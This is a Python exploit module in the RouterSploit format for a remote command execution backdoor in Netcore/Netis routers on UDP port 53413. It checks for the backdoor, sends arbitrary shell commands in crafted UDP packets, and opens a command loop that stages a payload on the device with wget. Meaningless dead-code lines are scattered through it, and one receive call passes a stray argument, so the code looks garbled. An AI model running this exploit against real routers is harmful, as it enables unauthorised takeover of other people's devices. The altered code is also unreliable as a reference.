from routersploit.core.exploit import *
from routersploit.core.udp.udp_client import UDPClient

class Exploit(UDPClient):
    __info__ = {'name': 'Netcore/Netis UDP 53413 RCE', 'description': 'Exploits Netcore/Netis backdoor functionality that allows executing commands on operating system level.', 'authors': ('Tim Yeh, Trend Micro', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.seebug.org/vuldb/ssvid-90227', 'http://blog.trendmicro.com/trendlabs-security-intelligence/netis-routers-leave-wide-open-backdoor/'), 'devices': ('Netcore Router', 'Netis Router')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(53413, 'Target UDP port')

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        if self.check():
            print_success('Target is vulnerable')
            print_status('Invoking command loop...')
            shell(self, architecture='mipsle', method='wget', location='/var')
        else:
            print_error('Target is not vulnerable')

    def execute(self, cmd):
        if False:
            print('Hello World!')
        cmd = bytes(cmd, 'utf-8')
        payload = b'AA\x00\x00AAAA' + cmd + b'\x00'
        udp_client = self.udp_create()
        udp_client.send(payload)
        response = udp_client.recv(udp_client, 1024)
        udp_client.udp_close()
        if response:
            return str(response[8:], 'utf-8')
        return ''

    @mute
    def check(self):
        if False:
            return 10
        response = b''
        payload = b'\x00' * 8
        udp_client = self.udp_create()
        udp_client.send(payload)
        if udp_client:
            response = udp_client.recv(1024)
            if response:
                if response.endswith(b'\xd0\xa5Login:'):
                    return True
                elif response.endswith(b'\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x01\x00\x00'):
                    return True
        return False